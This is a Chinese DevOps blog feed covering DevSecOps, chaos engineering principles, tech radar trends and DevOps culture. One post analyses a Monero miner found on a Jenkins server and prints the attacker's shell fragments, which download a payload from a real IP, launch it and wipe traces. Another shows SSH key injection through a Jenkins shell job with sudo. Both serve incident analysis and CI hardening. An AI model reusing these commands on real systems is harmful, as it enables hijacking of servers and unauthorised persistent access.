在 DevOps 运动刚开始的时候，安全并不是一个主要的 Topic，只是一系列需要注意的事项，于是在做 DevOps 实践的时候，把安全放在了最后考虑，即 DevOpsSec。随着 DevOps 的实践越来越激进，新的工具不断从社区涌现。安全作为 DevOps 的阻力则越来越大。但安全始终是绕不开的重要事情。因此，DevOps 社区尝试用同样的办法炮制和安全部门的合作以及安全实践，随后有了 DevSecOps，Sec 逐渐成为了 DevOps 实践中重要的一环。
就像我们之前讲的，面对复杂多变的云环境，安全要作为第一考量首先考量，而不是事后弥补。这一点就和我们在持续交付中探讨的“质量內建”一样。在云平台上实践 DevOps 要做到“安全內建”（Build Security In），这不单单是说我们增加几个自动化安全扫描的工具就足够的。要从系统的角度来重新思考安全在整个应用生命周期和团队的实践。ThoughtWorks 的安全社区在&amp;quot;安全內建&amp;quot;总结出了自己的实践，详细内容可以参考 buildsecurityin 网站。
在上一期的技术雷达上，我们提到了混沌工程，混沌工程是在分布式系统上进行实验的学科, 目的是建立对系统抵御生产环境中失控条件的能力以及信心。在此基础上，本期技术雷达即将提到“安全混沌工程”，安全混沌工程 将扩展了安全技术的范畴：将误报引入到生产环境网络和其他基础设施 - 例如，构建时的依赖关系中。 检查是否有能力在受控条件下识别安全故障。但在初期阶段，应谨慎使用此技术, 避免团队遇到安全问题。
另一方面，云平台服务商自己也推出了安全审计工具。Scout2 就是在 AWS 上的一款安全审计工具，可以自动帮你收集 AWS 上的配置数据以用于审计，它甚至可以帮助你生成攻击面报告。
Service Over Tools # 在企业级的 DevOps 实践中，技术实践的很大一部分内容都是引入先进的管理工具的理念。例如引入持续交付服务器，代码管理服务器，自动化测试套件等等…… 引入的工具在提高团队生产力和敏捷性的同时，也给团队带来了新的挑战：由于每家企业的组织结构和流程不同，加之团队的工程实践能力参差不齐。就导致了很多实践并没有很好的落地执行，企业自身都需要对 DevOps 引入的技术实践进一步消化。
但在云原生的场景下，我们无需去构造工具链，因为工具链本身是为最佳实践服务的。我们只需要根据自己的实践选择对应的服务就可以了，不光包含云平台自身的，也包括外部的。</description></item><item><title>翻译-混沌工程的原则</title><link>https://wwww.guyu.me/posts/2018-03-01-principlesofchaos-zh-cn/</link><pubDate>Thu, 01 Mar 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-03-01-principlesofchaos-zh-cn/</guid><description>混沌工程是在分布式系统上进行实验的学科, 目的是建立对系统抵御生产环境中失控条件的能力以及信心。
大规模分布式软件系统的发展正在改变软件工程。作为一个行业，我们很快采用了提高开发灵活性和部署速度的实践。紧跟着这些好处的一个紧迫问题是：我们对投入生产的复杂系统中有多少信心？
即使分布式系统中的所有单个服务都正常运行, 这些服务之间的交互也会导致不可预知的结果。 这些不可预知的结果, 由影响生产环境的罕见但破坏性的真实事件复合而成，令这些分布式系统存在内在的混沌。
我们需要在异常行为出现之前，在整个系统的范围内找出这些弱点。 系统弱点包括以下形式: 当服务不可用时的不正确回退设置;不当的超时设置导致的重试风暴;由于下游依赖项流量过载导致的服务中断;单点故障时的级联失败等。我们必须主动的发现这些重要的弱点，在这些弱点通过生产环境暴露给我们的客户之前。我们需要一种方法来管理这些系统固有的混沌, 通过增加的灵活性和速率以提升我们对生产环境部署的信心, 尽管系统的复杂性是由这些部署所导致的。
基于经验和系统的方法解决了分布式系统在规模增大时引发的混乱问题, 并以此建立了对这些系统抵御现实条件的能力的信心。 我们通过在受控实验中观察分布式系统的行为来了解它的特性。 我们称之为混沌工程。
混沌工程实践 # 为了具体地解决分布式系统在规模上的不确定性，可以把混沌工程看作是为了揭示系统弱点而进行的实验。这些实验遵循四个步骤：
首先，用系统在正常行为下的一些可测量的输出来定义“稳态”。 假设这个稳定状态在控制组和实验组都会继续存在。 引入反映真实世界事件的变量，如服务器崩溃、硬盘故障、网络连接断开等。 试图通过假设控制组和实验组之间的稳态差异来反驳这个假设。 破坏稳态的难度越大，我们对系统行为的信心就越强。如果发现了一个弱点，那么我们就有了一个改进目标。避免在系统规模化之后被放大。
高级原则 # 以下原则描述了应用混沌工程的理想方式，这些原则基于上述实验过程。 对这些原则的匹配程度能够增强我们在大规模分布式系统的信心。
建立一个围绕稳定状态行为的假说 # 要关注系统的可测量输出, 而不是系统的属性。 对这些输出在短时间内的度量构成了系统稳定状态的一个代理。 整个系统的吞吐量、错误率、延迟百分点等都可能是表示稳态行为的指标。 通过在实验中的系统性行为模式上的关注, 混沌工程验证了系统是否正常工作, 而不是试图验证它是如何工作的。
多样化真实世界的事件 # 混沌变量反映了现实世界中的事件。 我们可以通过潜在影响或估计频率排定这些事件的优先级。 考虑与硬件故障类似的事件, 如服务器宕机、软件故障 (如错误响应) 和非故障事件 (如流量激增或缩放事件)。 任何能够破坏稳态的事件都是混沌实验中的一个潜在变量。
在生产环境中运行实验 # 系统的行为会依据环境和流量模式都会有所不同。 由于资源使用率变化的随时可能发生, 因此通过采集实际流量是捕获请求路径的唯一可靠方法。 为了保证系统执行方式的真实性与当前部署系统的相关性, 混沌工程强烈推荐直接采用生产环境流量进行实验。
持续自动化运行实验 # 手动运行实验是劳动密集型的, 最终是不可持续的，所以我们要把实验自动化并持续运行。 混沌工程要在系统中构建自动化的编排和分析。
最小化爆炸半径 # 在生产中进行试验可能会造成不必要的客户投诉。虽然对一些短期负面影响必须有一个补偿, 但混沌工程师的责任和义务是确保这些后续影响最小化且被考虑到。
混沌工程是一个强大的实践, 它已经在世界上一些规模最大的业务系统上改变了软件是如何设计和工程化的。 相较于其他方法解决了速度和灵活性, 混沌工程专门处理这些分布式系统中的系统不确定性。 混沌工程的原则为我们大规模的创新和给予客户他们应得的高质量的体验提供了信心。
欢迎加入混沌社区的 Google 讨论组和我们一起讨论这些原则的应用。</description></item><item><title>从最新一期技术雷达看 DevOps 的发展</title><link>https://wwww.guyu.me/posts/2017-12-07-devops-trends-in-tech-radar/</link><pubDate>Thu, 07 Dec 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-12-07-devops-trends-in-tech-radar/</guid><description>今年4月份，我第一次以主编的身份参加技术雷达的翻译工作。有幸第一时间参加到技术雷达的翻译过程中。通过我在翻译其间对条目的了解和观察，我写下了《DevOps发展的九个趋势》
今年11月份，我再一次以执行主编的身份参加第17期技术雷达的翻译工作。17 期技术雷达中两大主题：Kubernetes 和 Cloud as the New Normal 都是 DevOps 相关的。而且本期技术雷达涌现了众多 DevOps 相关的新条目。一方面说明了 DevOps 在 IT 业的重要性日渐增加，一方面也支撑起了 DevOps 社区在工具和实践上的创新。虽然每个人对 DevOps 的理解不尽相同，但能持续的着眼在具体的问题并提供实际的解决方案则是值得称道的。
这些新的变化对我上一期的 DevOps 技术趋势判断和发展有了新的思考和认识，借由此文分享给大家。
回顾2017年 DevOps 发展 # 在今年 4月第16期技术雷达发布后，我分析了 DevOps 发展的九个趋势。我认为这九个趋势代表了2017年 DevOps 技术的发展方向。让我们来结合最新的技术雷达回顾一下2017年这些趋势的发展。
趋势1：微服务目前仍然是DevOps技术应用和发展的主要领域 # 现状：微服务的相关技术仍然不断涌现。但人们似乎过于乐观的估计了微服务的投资回报速度。架构演进是一个长期的过程，而实践中的陷阱和问题越来越多。不断涌现的诸多工具和解决方案说明了微服务的反思已经开始。让我们期待更多微服务的案例出现。
趋势2：以Docker为核心的数据中心方案逐渐走向成熟 # 现状：Kubernetes 生态圈在 Docker 编排工具的争霸大战中笑道了最后，本期技术雷达把 Kubernetes 移动到了“采用”中，证明 Kubernetes 是经得住时间考验的工具。随着越来越多的厂商和社区开始围绕 Kubernetes 构建自己的产品，我相信基于 Kubernetes 的产品和工具会越来越多。
趋势3：不完整的DevOps实践阻碍着DevOps的发展 # 现状：虽然 DevOps 社区的活跃程度催生了一大批的工具和平台，但却在推广实践上发力不足。接受了局部技术改进后的 DevOps 演进似乎立刻停止，使得 DevOps 难以发挥出更大的价值。随着时间的发展，这种局面会愈来愈常见。如方法论的推广落后于工具的发展，那么 DevOps 运动的寿终正寝也将为期不远。
趋势4：领域特定的DevOps实践开始出现 # 现状：虽然并没有十分特别的领域特定的 DevOps 技术出现。但受到 DevOps 启发的 DesignOps 和 DevSecOps 也分别有了自己的社区群体。期待它们在未来有进一步的表现。
趋势5：采用DevOps进行技术债务重组和技术资产管理 # 结果：我写下这个趋势的第二周就进入了这样一个技术资产管理项目并工作到现在。在这 6 个月中我和同事们采用了 DevOps 理念和技术进行技术资产重组和互联网企业 IT 资产并购，并体会到了其中的诸多益处，大大节约了产品上线时间和上线风险，而且产品的开支的随着时间以更快的速度递减。随着 CloudNative 的技术和概念的成熟，相信这类的项目和案例会越来越丰富。
趋势6：安全成为推动DevOps全面发展的重要力量 # 结果：OWASP Top10 和 OWASP Top10 Mobile 的姗姗来迟虽然并未进入本期技术雷达。但并不表明技术雷达对安全有所松懈，这反而是一种更加负责的态度。而安全相关的实践已从使用工具进入安全场景的设计。例如最新期的 3Rs 安全 和 上一期就提到的 KeyCloak，以及本期提到的用于安全的 Sidecar 模式。</description></item><item><title>关于 DevOps ，咱们聊的可能不是一回事</title><link>https://wwww.guyu.me/posts/2017-12-03-we-are-talking-different-devops/</link><pubDate>Sun, 03 Dec 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-12-03-we-are-talking-different-devops/</guid><description>在过去的三年中，我作为 DevOps 的咨询师参与了很多企业的 DevOps 转型咨询以及技术实施，也在不同的社区活动中分享了自己在 DevOps 上的实践、理解和观点。
随着 DevOps 的盛行，我在很多场合和越来越多的人聊起 DevOps。也在不同的渠道听到了很多人在讲 DevOps。然而，讨论的背后，我发现每个人对 DevOps 所指并不是同一件事情，也由于各执一词导致不欢而散。
于是我通过 DevOpsDays 的官方网站整理所有 DevOps 的有关材料，随着学习和了解的不断增多，我也渐渐的对 DevOps 有了更进一步的认识。我把学到的材料经过整理后把陆续放在了简书上，形成了&amp;quot; DevOps 前世今生&amp;quot; 这个系列，这个系列还在不断补充新的材料。
含义越来越丰富的 DevOps # DevOps 至今都缺乏一个清晰和统一的认识。对于一场运动来说，这是一件好事，也同样是一件坏事。虽然 Patrick 曾经在自己的博客里一再提到自己对 DevOps 的&amp;quot;正确认识''，但社区似乎不以为然。
缺乏“官方定义”好处是人人都可以定义，因此没有一个人或者组织可以垄断 DevOps 定义权。所以每个人都自己可以参与到这一运动中去，不断为其增加新的概念、新的实践和新的工具。这会使 DevOps 社区不断的繁荣。
而坏处也很明显，对于 DevOps 的后来者 —— 那些没有参与进来的人，需要学习和理解的 DevOps 知识的广度和深度也越来越大。
以至于后来出现了这幅众所周知的“盲人摸象图”：
这幅图中包含了很多概念，但主要表现的意义 DevOps 是一系列概念的总和，任何一个单方面的定义只是 DevOps 的一个部分，而不是 DevOps 的整体，随着 DevOps 这个概念的不断膨胀，人们就更难理解 DevOps 了。
那么，你理解的 DevOps 是指的什么 # 在接触了各类客户和社区之后，我开始尝试理解每个人谈到 DevOps 的时候，他们分别指的是什么，以及所指内容背后的目标和动机。渐渐的，我把我所听到的 DevOps 概念分成如下四类，分别是：
DevOps 是一组技术/实践 DevOps 是一个角色 DevOps 是一种工作方式 DevOps 是一种组织结构 那么，我们分别来谈谈这四类 DevOps。
当 DevOps 是一组技术/实践 # 在工程师文化的组织里，对先进技术的渴望是最常见的学习动机。可以促进工程师用更有效率，更优雅的方式解决问题。而对于非工程师文化的组织，新的技术往往是提升其 KPI 的工具。以下是我听到 DevOps 的时候，经常触及的话题：
高频部署 持续交付 云计算/虚拟化技术 基础设施即代码 Docker 自动化运维 高频部署 # 曾经和某跨国著名银行的外汇交易产品的 IT 产品负责人交流 DevOps。对方很自豪的告诉我，他们产品每天的部署频率超过500次，我听了不以为然。因为，部署频率高不见得是件好事。于是我问了以下几个问题：</description></item><item><title>你的 CI 在挖矿吗？</title><link>https://wwww.guyu.me/posts/2017-06-28-are-your-ci-mining/</link><pubDate>Wed, 28 Jun 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-06-28-are-your-ci-mining/</guid><description>我们的持续集成服务器搭建在AWS上的一个EC2的虚拟机中。采用 Jenkins 2.46.1 并且只有一个Master实例来运行所有的任务。且采用持续部署——团队每天要在开发环境自动部署10+个版本。整个过程由Jenkins内部构建的流水线触发。代码提交，测试，构建，部署一气呵成。
我们有一个中心产品代码库，这个中心产品对应着不同国家的在线产品。分别是：新加坡，马来西亚，印度尼西亚和香港。为了安全起见，我们为每一个产品的环境单独部署了一套持续交付流水线。由于各地域产品的差异较小，我们采用同一套基础设施配置初始化Jenkins配置，因此，我们有四台差不多的持续交付流水线。
从一次“构建变慢“的调查说起 # 在周二的时候，突然有人发现”马来西亚“的部署流程开始变慢，其中构建过程从上周的的7分钟左右变成了44分钟。而同样的代码改动，其它国家的服务器并没有如此大的差异。
那么问题一定在这个服务器上！
影响构建速度的因素主要是资源的占用导致的等待，这方面的资源包括：CPU、内存、磁盘和网络。
由于我们采用NewRelic对所有的持续集成服务器进行监控。所以可以得到CPU、内存、磁盘和网络的性能监控数据以及横向的对比信息。通过对比相关的数据，我们发现这一台服务器上有个在/tmp目录下运行的叫`donns`的陌生进程长期占用大量CPU，它的文件权限属于Jenkins用户以及Jenkins用户组。所以这个程序的执行是由Jenkins出发了。
我们在Jenkins的相关网站里搜索这个名为donns进程的相关信息，但一无所获。于是我们在/tmp目录中寻找和这个进程相关的信息，我们发现了一个陌生的Shell脚本，打开内容看，内容却让我们大跌眼镜。以下是几个重要的脚本片段：
代码片段 1:
pkill conns ps auxw|head -1;ps auxw|sort -rn -k3|head -1|awk &amp;#39;{if(\$3\&amp;gt;80.0) print &amp;#34;kill -9 &amp;#34; \$2}&amp;#39;|sh pkill bonns 我们看到，这段代码杀死了占用CPU超过80%的进程。此外，杀死了名为conns和bonns的进程。
conns进程是什么？bonns进程又是什么？为什么要杀死CPU占用率超过80%的进程？
代码片段 2:
wget 91.235.143.129:8086/587b626883fdc.png -O /tmp/conn wget 91.235.143.129:8086/1eac80002f.conf -O /tmp/config.conf 从91.235.143.129:8086下载了一个图片和一个配置文件。这个服务器是干嘛的？这个配置文件又包含了哪些内容？
通过在自己的沙盒环境里打开这个配置文件，发现它的内容是这样的：
{ &amp;#34;url&amp;#34; : &amp;#34;stratum+tcp://xmr.crypto-pool.fr:3333&amp;#34;, &amp;#34;user&amp;#34; : &amp;#34;43ZQzwdYHC9ebXxZhJuwkH5jvmfEBCEjkd1PvqxacrJaEDQFyNuxJhcib8MsJRgFnbATB6rpBEzq8EKqRqUbjyNy3opCS4k&amp;#34;, &amp;#34;pass&amp;#34; : &amp;#34;x&amp;#34; } stratum+tcp 协议引发了我的好奇心，经过调查，这居然是一个叫做门罗币的加密虚拟币的矿池协议：
门罗币****XMR一种使用CryptoNote协议的一个虚拟币币种，其并不是比特币的一个分支。CryptoNote在2012年已经开发出来，当年已有Bytecoin使用CrytoNote技术，XMR是在2014年开发出来，可以预见CryptoNote技术已经非常成熟，该技术通过数字环签名提供更好的匿名性。目前国内对该币种匿名技术宣传较少，国外知名度较高。Monero词语是引自于世界语，在世界语中的含义表示为货币。
而矿池则是是比特币(Bitcoin)等P2P密码学虚拟货币开采所必须的基础设施，一般是对外开放的团队开采服务器，其存在意义为提升比特币开采稳定性，使矿工薪酬趋于稳定。
假设100万人参与比特币挖矿，全网400P算力，其中90%的矿工为1P(1000T)以下的算力，如果投入一台1T矿机，将占全网算力的40万分之1，理论上平均每40万个10分钟能挖到一个区块，也就是7.6年才能挖到一个区块然后一次性拿到50个比特币。那么，假如我再找9个拥有1T算力矿机的矿工，达成协定，我们总共10个人，其中任何一个人挖到区块，都按照每人的算力占比来进行平分，那么我们就是一个整体，总共10T算力，那么平均0.76年即可挖到一个区块，然后算下来到我们手上的就是0.76年开采到5个比特币，如果组织100人、1000人、1万人甚至10万人呢？如果是10万人，那么平均100分钟就能挖到1个区块，作为团队的一份子，我的收入将会趋于稳定。这就是矿池的基本原理，即大家组队进行比特币开采，可以参考彩票中的合买。
当然，以上只是对矿池的基本原理和性质进行简单的描述，实际情况会非常复杂。矿池是一个全自动的开采平台，即矿机接入矿池——提供算力——获得收益。
抱着“大胆假设，小心求证”的心态，我们找到了配置文件中这家叫做crypyto-pool的网站https://monero.crypto-pool.fr/它是一个著名门罗币的矿池网站。而通过配置文件的用户名，我们看到了这个程序的挖矿记录和转账记录。根据6月份的交易数据以及对应牌价，截止作者发稿时，该程序已 为作者赚取了 1165.64 美元的收益。
而接下来的代码间接暴露了证据：
代码片段 3:
dd if=/tmp/conn skip=7664 bs=1 of=/tmp/donns chmod +x /tmp/donns nohup /tmp/donns -B -c /tmp/config.conf \&amp;gt;/dev/null 2\&amp;gt;&amp;amp;1 &amp;amp; rm -rf /tmp/config.conf rm -rf /tmp/conn rm -rf /tmp/conns rm -f /tmp/bonn.sh 这段脚本不光执行了程序，并且删除了执行后的相关文件记录。确认了是挖矿进程之后，我们果断的停止了进程，并且把对应的环境制作成了临时镜像以便做进一步分析。</description></item><item><title>DevOps前世今生 - DevOps 的文化</title><link>https://wwww.guyu.me/posts/2017-05-21-devops-culture/</link><pubDate>Sun, 21 May 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-05-21-devops-culture/</guid><description>用工具堆砌的DevOps 幻觉 # 在第一届 DevOpsDays结束后，DevOps 运动则如星火燎原之势在全球发展开来。随着 DevOps 思想的不断传播，相对的质疑和批评也从未停止过。以至于到今天对于 DevOps 的定义还是众说纷纭，争论不休。
当人们还在争论 DevOps的时候，一批基于敏捷的工程实践和自动化工具带着 DevOps 的标签走入了人们的视野。人们开始认为 DevOps 就是使用这些工具进行自动化。
在早期的 DevOps 实践里，开发和运维仍然是分离的。而在很多企业中，运维部门往往是核心部门，评审应用软件的架构设计和上线要求。于是运维部门开始利用这些被称作为“DevOps”的自动化工具管理设备和应用系统。并且将自己相关的实践打赏了“DevOps”的标签传播开来。
于此同时，开发团队开始采用这些工具构建开发用的测试环境。并将运维需求带入了开发流程中，这促进了內建质量。并且利用持续集成服务器（Continous Integration Serever） 构建持续交付流水线（Continuous delivery pipeline）来可视化软件交付的进度和流程，并通过流水线完成了自动化部署。持续集成服务器连接了开发和运维！
这就是DevOps ？
“同床异梦” 的 DevOps # 虽然开发团队和运维团队使用的工具变了，然而事情却没有改变：我们仍然能看到”流程结合在一起，但工作目标仍然分离“的两个团队：运维团队仍然牢牢控制着环境，控制着上线标准和上线流程。通过补充更多自动化的测试和验证手段构建更加严格的控制着变更的入口和出口。开发团队仍然不停的为了满足运维团队制定的更加严格的开发规范更加努力的学习各种工具而不断加班。
运维团队仍然不关心开发团队是否需要帮助，开发团队也依然不了解运维团队在做什么。如果没有 DevOps文化的建立，DevOps 仅仅是“通过自动化工具和手段构建的标准流程”而已。
有人甚至开始把这两个团队融合在了一起，变成了一个团队。这在一定程度上缓解了这种矛盾，但是相互指责却并没有让团队凝聚起来更加具有战斗力。而是变成了一个缓慢而争论不休的“Dev和Ops 法庭”：项目经理或者产品经理成为了法官，Dev 和 Ops 则轮番成为原告和被告。
这不是 DevOps !
早期的 DevOps文化：信任和尊重 # 早在 “10+ Deploys Per Day: Dev and Ops Cooperation at Flickr” 的演讲里，就总结出了 Dev 和 Ops 的合作并不能仅仅只有工具，还需要依托文化把某些行为和价值观带到组织内部。这个演讲很有洞见的总结了 Dev 和 Ops 的不同观点和思维模式，并从 Dev 和 Ops 的立场分别给出了促进合作的建议。这其中包括：
尊重：避免成见并尊重他人的经验，观点和责任。不要只是一味的拒绝改变，或者把隐藏细节。对于Dev 来说，当和 Ops 交流的时候，则应该告诉代码对 Ops 工作的影响。
信任：对于 Ops 来说，他们应该相信 Dev 新增加的功能。对于 Dev 来说，他们 应该相信 Ops对基础设施的改动，而且每个人都应该相信对方已经做到最好。 Ops 应该更加透明，不光需要分享运行指南和故障预案，而且还要给 Dev 能够访问机器的权限。
对失败的健康态度：尽管经过层层严格的测试，失败在很多情况下是无法避免的。但如果能像飞机的安全说明那样制定出应急预案，则可以在失败后尽可能的减少损失。
避免指责：指责会把大量的时间花在问题责任的界定而非问题的解决上。对于 Dev 来说，他们需要时刻记得当他们写下的 代码搞砸了之后，总会有 Ops 半夜第一个被叫醒去解决问题。而对于 Ops 来说，需要给当前的状况有建设性的建议和反馈，而不仅仅是抱怨和指责 。
缺失的 DevOps文化建设 —— 用技术升级粉饰制度问题 # 在很多管理层看来，这些不可思议的做法颠覆了经典的运维管理经验，看起来很美好而往往和现有的制度存在冲突而难以落地。另一方面，工程师却很向往这样一种梦想的工作环境，可以摆脱那些无意义争斗和约束，做真正有意义的事情。</description></item><item><title>DevOps发展的九个趋势</title><link>https://wwww.guyu.me/posts/2017-05-02-devops-in-tech-radar/</link><pubDate>Tue, 02 May 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-05-02-devops-in-tech-radar/</guid><description>DevOps 包含了太多方面的技术和实践，很难通过一个统一的工具链来描述其发展。即便如此，我们仍然可以从 ThoughtWorks 技术雷达的条目变动中看出一些趋势。今年，我有幸作为主编参与了最新一期技术雷达的翻译，作为 DevOps 的爱好者，十分高兴能在这一过程中看到 DevOps 未来发展的几个趋势，总结成了这篇文章。
趋势1：微服务目前仍然是 DevOps 技术应用和发展的主要领域 # 微服务将单块应用系统切割为多个简单独立的应用。从技术上说，这是通过工具把应用程序的内部复杂度转化为外部复杂度，需要一系列工具支撑微服务本身以及服务之间的通信。从组织上说，微服务团队要满足“快速发布，独立部署”的能力，则必须具备 DevOps 的工作方式。
如何拆解微服务一直是微服务技术应用的最大难点之一，领域驱动设计是比较理想的微服务拆解方法论。社会化代码分析帮助团队通过更精确的数据找到更加合适的拆分点。CodeScene是一个在线服务，它能帮助识别出热点和复杂且难以维护的子系统，通过分析分布式子系统在时间上的耦合发现子系统之间的耦合。此外，它还能帮你认识组织中的康威定律，这会大大降低微服务解耦的难度。
此外，微服务系统本质上是一个分布式系统，分布式系统之间的通信一直是很重要的问题。本期介绍的Kafka Streams和OpenTracing就是这类技术的条目。Kafka 作为一个成熟的分布式消息系统已经被广泛采用，而 Kafka Streams 则将最佳实践以“库”的方式呈现给开发人员，使得操作 Kafka 更加自然和简单。而 OpenTracing 则弥补了跨越多个微服务之间请求追踪的空白。
另一方面，**无服务器风格的架构（Serverless architecture ）**把 DevOps 技术在微服务领域的应用推向极致。当应用程序执行环境的管理被新的编程模型和平台取代后，团队的交付生产率得到了进一步的提升。一方面它免去了很多环境管理的工作，包括设备、网络、主机以及对应的软件和配置工作，使得软件运行时环境更加稳定。另一方面，它大大降低了团队采用 DevOps 的技术门槛。然而，端到端的交付以及微服务中的函数管理问题日渐突出，尽管AWS API gateway和AWS Lambda几乎成了 Serverless 架构的代名词，但这二者结合的开发者体验并不佳。于是出现了Serverless framework和CLAUDIA这样的管理工具。
AWS Lambda 带来的优势也深深影响了企业级应用领域，Apache OpenWhisk就是企业级无服务器领域的选择之一，它使得企业级应用也可以采用无服务器风格的架构构建应用程序。
在微服务端到端交付流程上，Netflix 开源了自家的Spinnaker，Netflix 作为微服务实践的先锋，不断推出新的开源工具来弥补社区中微服务技术和最佳实践的缺失。 而Spring Cloud则为开发者提供了一系列工具，以便他们在所熟悉的 Spring 技术栈下使用这些服务协调技术(coordination techniques)，如服务发现、负载均衡、熔断和健康检查。
而在微服务的安全上，最常见的需求之一是通过身份验证和授权功能来保护服务或 API。 这部分功能往往是最重要且不断重复构造的。而Keycloak就是一个开源的身份和访问管理解决方案，用于确保应用程序或微服务的安全。且几乎不需要编写代码，开箱即用。它支持单点登录，社交网络登录和标准协议登录(如 OpenID Connect ， OAuth2 和 SAML 等)。
趋势2：以 Docker 为核心的数据中心方案逐渐走向成熟 # 在过去的两年，Docker 社区有了突飞猛进的发展，似乎每期技术雷达都会出现 Docker 相关的条目。而 Docker 往往和 DevOps 联系起来，被认为是推动 DevOps 发展的杀手级工具，以至于有些人会以团队是否采用 Docker 作为团队是否具备 DevOps 能力的标志。
而这一社区的创新数量则日渐平缓。一方面，开源社区激烈的竞争淘汰了一部分技术。另一方面，以 Docker 为中心的完整数据中心解决方案在不断的整合开源社区的零散工具并形成最佳实践。为端到端的开发和运维提供更完整的交付体验，各大厂商也相继开始推广自己的企业级整体收费解决方案，这表明 Docker 的使用已经走向成熟。
在本期的技术雷达里的条目中出现了Mesosphere DC/OS，这是构建统一技术栈数据中心的一个征兆。在这方面Docker EE和Rancher都是非常有力的竞争者。根据我的判断，在未来的 Docker 社区里，统一容器化数据中心的竞争者将会进一步减少。而之前的私有云方案则慢慢会被“以 Docker 为核心数据中心级全栈交付”取代。
趋势3：不完整的 DevOps 实践阻碍着 DevOps 的发展 # 很遗憾看到单一持续集成实例和不完整的持续集成（CI Theatre）这样的条目出现在技术雷达里。可以感到企业应用 DevOps 技术的紧迫性。这同时也暴露了 DevOps 领域里“缺乏门槛较低且成熟的 DevOps 实践”的问题。</description></item><item><title>不要让你的持续集成服务器成为安全隐患</title><link>https://wwww.guyu.me/posts/2017-03-03-your-ci-may-be-under-attack/</link><pubDate>Fri, 03 Mar 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-03-03-your-ci-may-be-under-attack/</guid><description>最近临时接手了一个客户测试环境和产品环境的维护工作。接手的客户资产里包含：代码库，生产环境主机，测试环境主机以及搭建在测试环境主机上的CI（基于Jenkins）。这个CI可以用来部署测试环境和生产环境的应用。
不久，接到了客户的一个维护请求：把最新的生产环境数据同步到测试环境里。
这个维护工作需要通过SSH登录到测试环境主机上进行操作。测试主机是通过 authorized_keys 进行 SSH 认证的，因此没有用户名和密码。这样有两个好处：一方面无需生产环境用户名密码。一方面可以按需吊销不再用的客户端。这样可以避免密码泄露。所以我需要把自己的 ssh public key 交给管理员，让他把我的 key 加到可访问列表里。
悲剧的是，管理员告诉我他的 key 因为更换电脑的关系没有及时更新。所以，他也登录不上去了。而且之前所有的管理员的 key 都失效了。我手上只有CI的管理员的用户名和密码，于是一个邪恶的想法就诞生了：
既然 CI 可以执行脚本，那么我是否可以通过CI把我的key注入进去 ？
于是我用Execute Shell的Job变成了我的命令行，通过CI运行日志得知了宿主用户的文件目录信息。然后把自己的ssh public key加到了登录列表里（此处省略敏感信息）：
sudo sh -c “cp \~/.ssh/authorized\_keys \~/.ssh/authorized\_keys.bak” sudo sh -c &amp;#34;echo ‘{**你的****ssh public key**}’ \&amp;gt;\&amp;gt; \~/.ssh/authorized\_keys&amp;#34; It works !
我成功的登录了机器，但这却暴露了一个问题：CI有可能会成为一个安全隐患。
首先，CI可以执行代码。这就意味着它有可能执行有害代码。
其次，CI缺乏足够的用户鉴权，这很有可能导致未授权用户访问。
那么，如何构建一个更安全的 CI 服务器 # rootless原则 # “神操纵着万物，你感觉得到他，但永远看不见他。” ——《圣经·希伯来书 11:27》
在服务器的世界里，root用户就是神，具有至高的权力和力量。如果有人获得了”神力“，后果可能不堪设想。
无论是Web服务器，还是CI服务器。都是这个世界里的二等公民，权限和力量都应该受到约束。执行的时候应该“
此外，应该极力避免sudo的滥用，尤其是对那些从外部访问的用户。很多情况下，为了操作方便，很多用户都有sudo的权限。但这恰恰造成了低权限用户提升自己的访问权限进行有害操作。
在上述的故事里，因为没有对Jenkins的主机用户做有效的隔离，导致了我可以用sudo注入自己的key获得机器的访问权限。
沙盒隔离原则 # 因为CI会执行脚本或运行程序，而这些程序和脚本极有可能是不安全的。所以，CI任务应该在隔离的安全沙盒中执行，例如：受限的用户，受限的权限，受限的空间。
在上述的故事里，我就通过CI执行了一段不安全的脚本成功获得了登录主机的权限。
如果这些任务执行在隔离并受控的Docker容器里，那么会安全得多。
也可以考虑采用TravisCI这样的第三方CI服务来保证安全性。
备份和备份核查原则 # 在上述的故事里，因为缺乏有效的备份机制，导致了所有人都失去了对主机的访问。此外，我在修改authorized_keys的时候先进行了备份。这样，如果我注入失败，还可以还原。
这里的备份，不光是对配置，数据的备份，还有岗位的备份。
如果有备份的管理员，完全不会出现这种事情。
如果有备份QA服务器，完全可以不需要当前的QA服务器。
在做任何变更前，都应该做好备份以及还原的准备。因为任何变更都会带来“蝴蝶效应”。
但是，光备份是不够的。如果备份不能有效还原，那和没有备份没有什么区别。所以，要定时的进行备份恢复测试。确保备份在各种情况下可用。
多重要素身份验证原则 # 上述的CI是暴露在互联网中的，任何一个人访问到这个站点，通过一定程度的密码破解，就可以获得这个CI的访问控制权限。从而可以做出上述的操作。
所以，有了用户名和密码，并不一定是可信用户。所以需要通过更多的手段，诸如手机短信验证码或者第三方认证集成来验证用户的身份。
关键操作手动验证原则 # 试想一下，如果上述的例子我并没有服务器的访问权限。而是通过提交未经审查的代码自动运行测试脚本。实际上也会造成同样的效果。
有时候我们会为了方便，让CI自动触发测试。但是，恰恰是这种“方便”，却带来了额外的安全隐患。而这样的方便，不光方便了自己，也方便了恶意入侵者。
所以，不能为了方便而留下安全隐患。在关键操作上设置为手动操作，并通过一定的机制保证关键操作的可靠性才是最佳实践。
构建安全 CI 的几个实践 # 采用Sibling的方式在Docker里运行CI任务。 账户密码管理统一采用LDAP认证，如果过期则从外部修改。 CI的登录权限和其它的认证方式（比如GItHub，Okta等）集成起来。并用组限制登录。 对于生产环境的CI，通过更加细粒度的权限限制来隔离一些危险操作。 官方的安全指南 # 不少CI软件的官方都提供了最佳实践以及安全指南帮助我们更好的构建CI服务器。请务必在构建CI前阅读并理解这些安全实践和措施，并遵照安全最佳实践构建CI服务器：
